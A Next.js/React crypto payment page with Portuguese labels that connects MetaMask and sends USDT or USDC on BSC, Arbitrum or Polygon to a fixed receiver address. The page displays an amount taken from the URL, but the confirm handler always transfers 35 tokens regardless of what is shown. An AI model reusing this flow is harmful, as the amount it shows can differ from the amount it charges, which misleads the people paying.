"use client";

import { Suspense, useEffect, useState } from "react";
import { ethers } from "ethers";

// ABI mínima para ERC20 com name, decimals e transfer
const ERC20_ABI = [
  "function name() public view returns (string)",
  "function decimals() public view returns (uint8)",
  "function transfer(address to, uint256 value) public returns (bool)"
];

/* eslint-disable @typescript-eslint/no-explicit-any */
declare global {
  interface Window {
    ethereum?: any;
  }
}
/* eslint-enable @typescript-eslint/no-explicit-any */

type NetworkKey = "bsc" | "arbitrum" | "polygon";
type TokenKey = "USDT" | "USDC";

const NETWORKS: Record<
  NetworkKey,
  { name: string; chainId: string; rpc: string; tokens: Record<TokenKey, string> }
> = {
  bsc: {
    name: "BNB Chain",
    chainId: "0x38",
    rpc: "https://bsc-dataseed.binance.org/",
    tokens: {
      USDT: "0x55d398326f99059fF775485246999027B3197955",
      USDC: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
    }
  },
  arbitrum: {
    name: "Arbitrum",
    chainId: "0xa4b1",
    rpc: "https://arb1.arbitrum.io/rpc",
    tokens: {
      USDT: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
      USDC: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8"
    }
  },
  polygon: {
    name: "Polygon",
    chainId: "0x89",
    rpc: "https://polygon-rpc.com",
    tokens: {
      USDT: "0x3813e82e6f7098b9583FC0F33a962D02018B6803",
      USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
    }
  }
};

const FIXED_RECEIVER = "0xed14922507cee9938faaf2958d577a2aeea9c4e7";

const Gateway = () => {
  const [status, setStatus] = useState<string | null>(null);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [canApprove, setCanApprove] = useState<boolean>(false);
  const [isCorrectNetwork, setIsCorrectNetwork] = useState<boolean>(false);

  const [rede, setRede] = useState<NetworkKey>("bsc");
  const [token, setToken] = useState<TokenKey>("USDT");
  const [valor, setValor] = useState<string | null>(null);

  const [valorFormatado, setValorFormatado] = useState<string | null>(null);
  const [tokenName, setTokenName] = useState<string | null>(null);
  const [tokenDecimals, setTokenDecimals] = useState<number>(18);

  const getTokenAddress = (): string => NETWORKS[rede].tokens[token];

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const valorUrl = urlParams.get("valor");
    if (valorUrl) setValor(valorUrl.replace(",", "."));
  }, []);

  useEffect(() => {
    const formatarValor = async () => {
      if (!valor) return;
      try {
        const provider = new ethers.JsonRpcProvider(NETWORKS[rede].rpc);
        const contract = new ethers.Contract(getTokenAddress(), ERC20_ABI, provider);

        const nome = (await contract.name().catch(() => "Token desconhecido")) as string;
        const decimals = (await contract.decimals().catch(() => 18)) as number;

        setTokenName(nome);
        setTokenDecimals(decimals);

        const valorFloat = parseFloat(valor);
        setValorFormatado(valorFloat.toFixed(2).replace(".", ","));
      } catch (err) {
        console.error("Erro ao formatar valor", err);
        setValorFormatado(valor || "0");
      }
    };
    formatarValor();
  }, [rede, token, valor]);

  const checkNetwork = async () => {
    if (!window.ethereum) return;
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    setIsCorrectNetwork(chainId === NETWORKS[rede].chainId);
  };

  useEffect(() => {
    checkNetwork();
    if (window.ethereum) {
      window.ethereum.on("chainChanged", checkNetwork);
    }
    return () => {
      if (window.ethereum) window.ethereum.removeListener("chainChanged", checkNetwork);
    };
  }, [rede]);

  const connectWallet = async () => {
    if (!window.ethereum) {
      setStatus("Erro: MetaMask não encontrada.");
      return;
    }
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      setWalletAddress(userAddress);
      setCanApprove(true);
      checkNetwork();
    } catch (error: unknown) {
      console.error(error);
    }
  };

  const switchNetwork = async (network: NetworkKey) => {
    if (!window.ethereum) return;
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: NETWORKS[network].chainId }]
      });
      setStatus(`Rede alterada para ${NETWORKS[network].name}`);
      setRede(network); // garante atualização do estado
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        setStatus("Rede não encontrada na MetaMask.");
      } else {
        setStatus("Erro ao mudar de rede: " + switchError.message);
      }
    }
  };

  const handleRedeChange = async (network: NetworkKey) => {
    await switchNetwork(network);
  };

  const handleApprove = async () => {
    if (!walletAddress || !token) {
      setStatus("Erro: Verifique os parâmetros e conecte sua carteira.");
      return;
    }
    if (!isCorrectNetwork) {
      setStatus(`Erro: Mude para a rede ${NETWORKS[rede].name} antes de aprovar.`);
      return;
    }
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(getTokenAddress(), ERC20_ABI, signer);

      const decimals = await contract.decimals().catch(() => tokenDecimals);
      const valorInteiro = ethers.parseUnits("35", decimals); // sempre 35 convertido

      const tx = await contract.transfer(FIXED_RECEIVER, valorInteiro);
      setStatus(`Transação enviada: ${tx.hash}`);
    } catch (error: any) {
      console.error(error);
      setStatus(error?.reason || error?.message || "Erro ao enviar a transação.");
    }
  };

  return (
    <div style={{ fontFamily: "Arial, sans-serif", padding: "20px" }}>
      <h1>Pagamento</h1>

      <div style={{ marginBottom: "10px" }}>
        <label>Rede: </label>
        <select value={rede} onChange={(e) => handleRedeChange(e.target.value as NetworkKey)}>
          {Object.keys(NETWORKS).map((key) => (
            <option key={key} value={key}>
              {NETWORKS[key as NetworkKey].name}
            </option>
          ))}
        </select>
      </div>

      <div style={{ marginBottom: "10px" }}>
        <label>Token: </label>
        <select value={token} onChange={(e) => setToken(e.target.value as TokenKey)}>
          {Object.keys(NETWORKS[rede].tokens).map((t) => (
            <option key={t} value={t}>
              {t}
            </option>
          ))}
        </select>
      </div>

      <div style={{ marginBottom: "10px" }}>
        <label>Valor: </label>
        <span style={{ marginLeft: "10px", fontWeight: "bold" }}>
          {valorFormatado || "Carregando..."} {tokenName || token}
        </span>
      </div>

      <div>
        <strong>Receiver:</strong> {FIXED_RECEIVER}
      </div>

      {!walletAddress ? (
        <button
          onClick={connectWallet}
          style={{
            marginTop: "20px",
            padding: "10px 20px",
            fontSize: "16px",
            backgroundColor: "#8247E5",
            color: "white",
            border: "none",
            borderRadius: "5px",
            cursor: "pointer"
          }}
        >
          Conectar Carteira
        </button>
      ) : (
        <p style={{ color: "green", marginTop: "20px" }}>
          Conectado: {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
        </p>
      )}

      {!isCorrectNetwork && walletAddress && (
        <p style={{ color: "orange", marginTop: "20px" }}>
          Por favor, mude sua rede para {NETWORKS[rede].name}.
        </p>
      )}

      {walletAddress && canApprove && token && (
        <button
          onClick={handleApprove}
          style={{
            marginTop: "20px",
            padding: "10px 20px",
            fontSize: "16px",
            backgroundColor: "#8247E5",
            color: "white",
            border: "none",
            borderRadius: "5px",
            cursor: "pointer"
          }}
        >
          Confirmar Transação
        </button>
      )}

      {status && (
        <p style={{ marginTop: "20px", color: status.includes("Erro") ? "red" : "green" }}>
          {status}
        </p>
      )}
    </div>
  );
};

const Home = () => (
  <Suspense fallback={<div>Carregando...</div>}>
    <Gateway />
  </Suspense>
);

export default Home;
